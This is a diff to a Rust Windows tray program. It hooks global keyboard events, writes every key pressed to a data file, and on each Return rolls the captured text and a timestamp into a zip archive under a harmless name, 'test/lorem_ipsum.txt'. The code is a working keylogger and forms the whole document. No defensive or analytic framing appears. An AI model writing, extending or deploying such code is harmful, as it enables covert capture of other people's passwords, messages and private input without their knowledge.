@@ -2,12 +2,19 @@ use core::mem::MaybeUninit;
 use winapi::um::winuser;
 use std::time::Instant;
 use std::io::prelude::*;
+use std::fs;
 use std::fs::OpenOptions;
 use std::io::Write;
+use std::io::{self, BufRead, Read};
+use std::io::BufReader;
 use std::path::Path;
+use std::str;
 use std::fs::File;
+use std::fs::read_to_string;
 use chrono::{Utc, DateTime};
 use monitor::*;
+
+const TEMP: &str = "./data.dat";
 
 fn main() {
     #[derive(Copy, Clone, Eq, PartialEq, Debug)]
@@ -76,7 +83,6 @@ fn main() {
         r.iter().for_each(|m| match m {
             Events::DoubleClickTrayIcon => {
                 println!("Double click");
-                zip_main();
             }
             Events::ClickTrayIcon => {
                 println!("Single click");
@@ -162,27 +168,35 @@ fn track_activity(event: Event) {
         EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
         EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
         EventType::KeyPress(Key::Return) => {
+            let zipped_string: String = readzip();
+
             let now = Utc::now();
             let x: String = format!("{}", now);
             let now_parsed: DateTime<Utc> = x.parse().unwrap();
-            let mut fileRef = OpenOptions::new()
-                .append(true)
-                .open("data.dat")
-                .expect("Unable to open file");   
-            fileRef.write("\n".as_bytes()).expect("write failed");
-            fileRef.write(now_parsed.to_string().as_bytes()).expect("write failed");
-            fileRef.write("\n".as_bytes()).expect("write failed");
+
+            let mut fileRead = OpenOptions::new()
+                .read(true)
+                .open(TEMP)
+                .expect("Unable to open file");
+
+            let mut data = String::new();
+            fileRead.read_to_string(&mut data);
+
+            zip_main(zipped_string + &data + "\n" + &now_parsed.to_string() + "\n");
+
+            let mut fileClear = OpenOptions::new()
+                .write(true)
+                .truncate(true)
+                .open(TEMP)
+                .expect("Unable to open file");
         },
         EventType::KeyPress(Key::Unknown(u32)) => println!("Unknown key!"),
         EventType::KeyPress(Key) => {
-            if !Path::new("data.dat").exists() {
-                let mut file = File::create("data.dat");
-            }
-
             let key = event.name.unwrap();
             let mut fileRef = OpenOptions::new()
                 .append(true)
-                .open("data.dat")
+                .create(true)
+                .open(TEMP)
                 .expect("Unable to open file");
     
             fileRef.write(key.as_bytes()).expect("write failed");
@@ -192,9 +206,9 @@ fn track_activity(event: Event) {
     }
 }
 
-fn zip_main() -> i32 {
+fn zip_main(text: String) -> i32 {
     let filename = "test.zip";
-    match dozip(filename) {
+    match dozip(filename, text) {
         Ok(_) => println!("File written to {filename}"),
         Err(e) => println!("Error: {e:?}"),
     }
@@ -202,7 +216,7 @@ fn zip_main() -> i32 {
     0
 }
 
-fn dozip(filename: &str) -> ZipResult<()> {
+fn dozip(filename: &str, text: String) -> ZipResult<()> {
     let path = std::path::Path::new(filename);
     let file = std::fs::File::create(path).unwrap();
 
@@ -218,36 +232,28 @@ fn dozip(filename: &str) -> ZipResult<()> {
     zip.write_all(b"Hello, World!\n")?;
 
     zip.start_file("test/lorem_ipsum.txt", Default::default())?;
-    zip.write_all(LOREM_IPSUM)?;
+    zip.write_all(text.as_bytes())?;
 
     zip.finish()?;
     Ok(())
 }
 
-const LOREM_IPSUM : &[u8] = b"Lorem ipsum dolor sit amet, consectetur adipiscing elit. In tellus elit, tristique vitae mattis egestas, ultricies vitae risus. Quisque sit amet quam ut urna aliquet
-molestie. Proin blandit ornare dui, a tempor nisl accumsan in. Praesent a consequat felis. Morbi metus diam, auctor in auctor vel, feugiat id odio. Curabitur ex ex,
-dictum quis auctor quis, suscipit id lorem. Aliquam vestibulum dolor nec enim vehicula, porta tristique augue tincidunt. Vivamus ut gravida est. Sed pellentesque, dolor
-vitae tristique consectetur, neque lectus pulvinar dui, sed feugiat purus diam id lectus. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per
-inceptos himenaeos. Maecenas feugiat velit in ex ultrices scelerisque id id neque.
+fn readzip() -> String {
+    let fname = std::path::Path::new("test.zip");
+    let file = fs::File::open(fname).unwrap();
+    let reader = BufReader::new(file);
 
-Phasellus sed nisi in augue sodales pulvinar ut et leo. Pellentesque eget leo vitae massa bibendum sollicitudin. Curabitur erat lectus, congue quis auctor sed, aliquet
-bibendum est. Ut porta ultricies turpis at maximus. Cras non lobortis justo. Duis rutrum magna sed velit facilisis, et sagittis metus laoreet. Pellentesque quam ligula,
-dapibus vitae mauris quis, dapibus cursus leo. Sed sit amet condimentum eros. Nulla vestibulum enim sit amet lorem pharetra, eu fringilla nisl posuere. Sed tristique non
-nibh at viverra. Vivamus sed accumsan lacus, nec pretium eros. Mauris elementum arcu eu risus fermentum, tempor ullamcorper neque aliquam. Sed tempor in erat eu
-suscipit. In euismod in libero in facilisis. Donec sagittis, odio et fermentum dignissim, risus justo pretium nibh, eget vestibulum lectus metus vel lacus.
+    let mut archive = ZipArchive::new(reader).unwrap();
 
-Quisque feugiat, magna ac feugiat ullamcorper, augue justo consequat felis, ut fermentum arcu lorem vitae ligula. Quisque iaculis tempor maximus. In quis eros ac tellus
-aliquam placerat quis id tellus. Donec non gravida nulla. Morbi faucibus neque sed faucibus aliquam. Sed accumsan mattis nunc, non interdum justo. Cras vitae facilisis
-leo. Fusce sollicitudin ultrices sagittis. Maecenas eget massa id lorem dignissim ultrices non et ligula. Pellentesque aliquam mi ac neque tempus ornare. Morbi non enim
-vulputate quam ullamcorper finibus id non neque. Quisque malesuada commodo lorem, ut ornare velit iaculis rhoncus. Mauris vel maximus ex.
+    let mut file = match archive.by_name("test/lorem_ipsum.txt") {
+        Ok(file) => file,
+        Err(..) => {
+            println!("File test/lorem_ipsum.txt not found");
+            return String::from("");
+        }
+    };
 
-Morbi eleifend blandit diam, non vulputate ante iaculis in. Donec pellentesque augue id enim suscipit, eget suscipit lacus commodo. Ut vel ex vitae elit imperdiet
-vulputate. Nunc eu mattis orci, ut pretium sem. Nam vitae purus mollis ante tempus malesuada a at magna. Integer mattis lectus non luctus lobortis. In a cursus quam,
-eget faucibus sem.
-
-Donec vitae condimentum nisi, non efficitur massa. Praesent sed mi in massa sollicitudin iaculis. Pellentesque a libero ultrices, sodales lacus eu, ornare dui. In
-laoreet est nec dolor aliquam consectetur. Integer iaculis felis venenatis libero pulvinar, ut pretium odio interdum. Donec in nisi eu dolor varius vestibulum eget vel
-nunc. Morbi a venenatis quam, in vehicula justo. Nam risus dui, auctor eu accumsan at, sagittis ac lectus. Mauris iaculis dignissim interdum. Cras cursus dapibus auctor.
-Donec sagittis massa vitae tortor viverra vehicula. Mauris fringilla nunc eu lorem ultrices placerat. Maecenas posuere porta quam at semper. Praesent eu bibendum eros.
-Nunc congue sollicitudin ante, sollicitudin lacinia magna cursus vitae.
-";
+    let mut contents = String::new();
+    file.read_to_string(&mut contents).unwrap();
+    contents
+}
